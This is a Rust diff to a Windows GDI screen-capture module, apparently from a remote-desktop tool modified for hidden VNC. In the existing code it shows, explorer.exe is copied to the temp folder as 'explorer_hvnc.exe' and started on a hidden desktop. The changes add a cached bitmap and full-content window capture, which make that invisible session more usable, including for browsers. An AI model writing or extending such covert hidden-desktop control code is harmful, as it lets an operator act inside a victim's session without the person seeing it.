@@ -61,6 +61,8 @@ pub struct CapturerGDI {
     width: i32,
     height: i32,
     desktop: HDESK,
+    cache_dc: HDC,
+    cache_bmp: HBITMAP,
 }
 
 impl CapturerGDI {
@@ -105,7 +107,10 @@ impl CapturerGDI {
                 // --- Explorer Launch Logic ---
                 // 1. Get Windows Directory
                 let mut buffer = [0u8; 260]; // MAX_PATH
-                let len = winapi::um::sysinfoapi::GetWindowsDirectoryA(buffer.as_mut_ptr() as *mut i8, 260);
+                let len = winapi::um::sysinfoapi::GetWindowsDirectoryA(
+                    buffer.as_mut_ptr() as *mut i8,
+                    260,
+                );
                 if len > 0 {
                     let windir = std::str::from_utf8(&buffer[..len as usize]).unwrap_or("");
                     let source_path = format!(r"{}\explorer.exe", windir);
@@ -113,8 +118,11 @@ impl CapturerGDI {
                     let target_path = temp_dir.join("explorer_hvnc.exe");
                     let target_path_str = target_path.to_string_lossy().to_string();
 
-                    println!("Copying explorer from {} to {}", source_path, target_path_str);
-                    
+                    println!(
+                        "Copying explorer from {} to {}",
+                        source_path, target_path_str
+                    );
+
                     // 2. Copy explorer.exe to temp
                     if let Err(e) = std::fs::copy(&source_path, &target_path) {
                         println!("Failed to copy explorer.exe: {}", e);
@@ -124,7 +132,7 @@ impl CapturerGDI {
                         let mut si: STARTUPINFOA = std::mem::zeroed();
                         si.cb = size_of::<STARTUPINFOA>() as _;
                         si.lpDesktop = hbb_common::config::DESKTOP_NAME.as_ptr() as *mut _;
-                        
+
                         let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
 
                         let res = CreateProcessA(
@@ -137,15 +145,21 @@ impl CapturerGDI {
                             ptr::null_mut(),
                             ptr::null(),
                             &mut si,
-                            &mut pi
+                            &mut pi,
                         );
 
                         if res != 0 {
-                            println!("Started explorer_hvnc.exe on hidden desktop. PID: {}", pi.dwProcessId);
+                            println!(
+                                "Started explorer_hvnc.exe on hidden desktop. PID: {}",
+                                pi.dwProcessId
+                            );
                             winapi::um::handleapi::CloseHandle(pi.hProcess);
                             winapi::um::handleapi::CloseHandle(pi.hThread);
                         } else {
-                            println!("Failed to start explorer_hvnc.exe, LastErr: {}", GetLastError());
+                            println!(
+                                "Failed to start explorer_hvnc.exe, LastErr: {}",
+                                GetLastError()
+                            );
                         }
                     }
                 } else {
@@ -180,6 +194,33 @@ impl CapturerGDI {
                 return Err("Can't select Windows buffer".into());
             }
 
+            // Initialize Cache DC and Bitmap
+            let cache_dc = CreateCompatibleDC(dc);
+            if cache_dc.is_null() {
+                DeleteDC(screen_dc);
+                DeleteDC(dc);
+                DeleteObject(bmp as _);
+                return Err("Can't create cache DC".into());
+            }
+
+            let cache_bmp = CreateCompatibleBitmap(dc, width, height);
+            if cache_bmp.is_null() {
+                DeleteDC(screen_dc);
+                DeleteDC(dc);
+                DeleteDC(cache_dc);
+                DeleteObject(bmp as _);
+                return Err("Can't create cache buffer".into());
+            }
+
+            if SelectObject(cache_dc, cache_bmp as _).is_null() {
+                DeleteDC(screen_dc);
+                DeleteDC(dc);
+                DeleteDC(cache_dc);
+                DeleteObject(bmp as _);
+                DeleteObject(cache_bmp as _);
+                return Err("Can't select cache buffer".into());
+            }
+
             Ok(Self {
                 screen_dc,
                 dc,
@@ -187,6 +228,8 @@ impl CapturerGDI {
                 width,
                 height,
                 desktop,
+                cache_dc,
+                cache_bmp,
             })
         }
     }
@@ -205,24 +248,30 @@ impl CapturerGDI {
                 return false;
             }
 
-            // println!("paint_window: HWND={:?}, Rect={:?}", wnd, rect);
+            let w = rect.right - rect.left;
+            let h = rect.bottom - rect.top;
 
-            let dc_window = CreateCompatibleDC(self.dc);
-            let bmp_window =
-                CreateCompatibleBitmap(self.dc, rect.right - rect.left, rect.bottom - rect.top);
-
-            if SelectObject(dc_window, bmp_window as _).is_null() {
-                // println!("SelectObject");
+            // Optimization: Skip off-screen windows
+            if rect.right < 0 || rect.bottom < 0 || rect.left > self.width || rect.top > self.height
+            {
+                return false;
             }
 
-            if PrintWindow(wnd, dc_window, 0) != 0 {
+            // We reuse self.cache_dc which already has self.cache_bmp selected.
+            // The cache_bmp is initialized to screen width/height, so it should be big enough for any window
+            // smaller than the screen. If a window is larger, it might clip, but that's acceptable for now.
+
+            // Try PW_RENDERFULLCONTENT (0x02) first for better capture (e.g. Chrome), then fallback
+            if PrintWindow(wnd, self.cache_dc, 0x00000002) != 0
+                || PrintWindow(wnd, self.cache_dc, 0) != 0
+            {
                 if 0 == BitBlt(
                     self.screen_dc,
                     rect.left,
                     rect.top,
-                    rect.right - rect.left,
-                    rect.bottom - rect.top,
-                    dc_window,
+                    w,
+                    h,
+                    self.cache_dc,
                     0,
                     0,
                     SRCCOPY | CAPTUREBLT,
@@ -232,9 +281,6 @@ impl CapturerGDI {
 
                 ret = true;
             }
-
-            DeleteObject(bmp_window as _);
-            DeleteObject(dc_window as _);
         }
 
         ret
@@ -362,8 +408,10 @@ impl Drop for CapturerGDI {
     fn drop(&mut self) {
         unsafe {
             DeleteDC(self.screen_dc);
+            DeleteDC(self.cache_dc);
             DeleteDC(self.dc);
             DeleteObject(self.bmp as _);
+            DeleteObject(self.cache_bmp as _);
             CloseDesktop(self.desktop);
         }
     }
